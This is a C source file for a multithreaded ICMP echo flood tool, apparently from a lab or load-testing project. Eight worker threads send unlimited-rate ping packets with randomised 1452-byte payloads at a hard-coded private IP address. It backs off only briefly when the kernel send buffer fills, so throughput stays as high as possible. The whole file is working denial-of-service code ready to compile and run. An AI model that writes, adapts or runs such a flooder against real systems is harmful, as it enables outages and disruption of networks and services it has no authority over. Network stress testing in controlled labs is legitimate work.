// Compile: gcc -O2 -pthread src/flooding/dos_icmp.c -o dos_icmp
// Run    : sudo ./dos_icmp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

#define TARGET_IP     "10.10.20.21"
#define WORKERS       8
#define PAYLOAD_SIZE  1452   /* Keep below MTU for datagram mode */
#define RATE_LIMIT_S  0.0   /* Seconds to wait between packets; 0 for unlimited */

struct worker_args {
    struct sockaddr_in target;
    size_t payload_size;
    double rate_limit;
    uint16_t base_seq;
};

static volatile sig_atomic_t keep_running = 1;

static void handle_sigint(int signum) {
    (void)signum;
    keep_running = 0;
}

/* Faster RNG than rand_r for per-packet mutations */
struct fast_rng {
    uint32_t state;
};

static inline uint32_t xorshift32(struct fast_rng *rng) {
    uint32_t x = rng->state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    rng->state = x ? x : 0x9E3779B9; /* avoid zero lockup */
    return rng->state;
}

static inline uint16_t rand16(struct fast_rng *rng) {
    return (uint16_t)xorshift32(rng);
}

static uint32_t checksum_partial(const void *data, size_t len) {
    const uint16_t *words = data;
    uint32_t sum = 0;

    while (len > 1) {
        sum += *words++;
        len -= 2;
    }

    if (len == 1) {
        uint16_t last = 0;
        memcpy(&last, words, 1);
        sum += last;
    }
    return sum;
}

static uint16_t checksum_finalize(uint32_t sum) {
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return (uint16_t)(~sum);
}

static uint16_t checksum(const void *data, size_t len) {
    return checksum_finalize(checksum_partial(data, len));
}

static void fill_payload(uint8_t *payload, size_t length, struct fast_rng *rng) {
    uint32_t *p32 = (uint32_t *)payload;
    size_t words = length / sizeof(uint32_t);
    for (size_t i = 0; i < words; ++i) {
        p32[i] = xorshift32(rng);
    }
    uint8_t *tail = (uint8_t *)(p32 + words);
    size_t tail_start = words * sizeof(uint32_t);
    for (size_t j = tail_start; j < length; ++j) {
        tail[j - tail_start] = (uint8_t)xorshift32(rng);
    }
}

static struct timespec rate_to_timespec(double rate_limit) {
    struct timespec ts = {0};
    if (rate_limit > 0.0) {
        ts.tv_sec = (time_t)rate_limit;
        ts.tv_nsec = (long)((rate_limit - ts.tv_sec) * 1e9);
    }
    return ts;
}

static void *flood_worker(void *arg) {
    struct worker_args *cfg = arg;
    size_t packet_size = sizeof(struct icmphdr) + cfg->payload_size;
    struct timespec ts = rate_to_timespec(cfg->rate_limit);
    uint16_t seq = cfg->base_seq;
    struct fast_rng rng = {.state = (uint32_t)(time(NULL) ^ (uintptr_t)pthread_self()) | 1U};

    /* Unprivileged ICMP datagram socket; kernel builds IP header */
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    uint8_t *packet = malloc(packet_size);
    if (!packet) {
        perror("malloc");
        close(sock);
        return NULL;
    }

    struct icmphdr *icmp = (struct icmphdr *)packet;
    uint8_t *payload = packet + sizeof(struct icmphdr);

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(getpid() & 0xFFFF);

    fill_payload(payload, cfg->payload_size, &rng);
    uint32_t payload_sum = checksum_partial(payload, cfg->payload_size);
    struct timespec enobufs_sleep = {.tv_sec = 0, .tv_nsec = 1 * 1000 * 1000}; /* 1ms backing off on ENOBUFS */

    while (keep_running) {
        icmp->un.echo.sequence = htons(seq++);
        uint16_t type_code = ((uint16_t)icmp->type << 8) | icmp->code;
        uint32_t icmp_sum = payload_sum + type_code + icmp->un.echo.id + icmp->un.echo.sequence;
        icmp->checksum = checksum_finalize(icmp_sum);

        if (sendto(sock, packet, packet_size, 0,
                   (struct sockaddr *)&cfg->target, sizeof(cfg->target)) < 0) {
            if (errno == ENOBUFS) {
                /* Kernel send queue full; brief pause to relieve pressure */
                nanosleep(&enobufs_sleep, NULL);
                continue;
            }
            perror("sendto");
            break;
        }

        if (cfg->rate_limit > 0.0) {
            nanosleep(&ts, NULL);
        }
    }

    free(packet);
    close(sock);
    return NULL;
}

int main(void) {
    struct sockaddr_in target = {
        .sin_family = AF_INET,
        .sin_port = 0,
    };

    if (inet_pton(AF_INET, TARGET_IP, &target.sin_addr) != 1) {
        fprintf(stderr, "Invalid target IP: %s\n", TARGET_IP);
        return EXIT_FAILURE;
    }

    printf("\n[CONFIG]\nTarget: %s\nWorkers: %d\nPayload Size: %zuB\n"
           "Theoretical Rate: %s\n\n",
           TARGET_IP, WORKERS, (size_t)PAYLOAD_SIZE,
           RATE_LIMIT_S == 0.0 ? "Unlimited" : "Limited");

    signal(SIGINT, handle_sigint);

    pthread_t threads[WORKERS];
    struct worker_args cfg = {
        .target = target,
        .payload_size = PAYLOAD_SIZE,
        .rate_limit = RATE_LIMIT_S,
        .base_seq = (uint16_t)(rand() & 0xFFFF),
    };

    int created = 0;
    for (int i = 0; i < WORKERS; ++i) {
        if (pthread_create(&threads[i], NULL, flood_worker, &cfg) != 0) {
            perror("pthread_create");
            keep_running = 0;
            break;
        }
        ++created;
    }

    for (int i = 0; i < created; ++i) {
        pthread_join(threads[i], NULL);
    }

    puts("[+] Test concluded");
    return EXIT_SUCCESS;
}
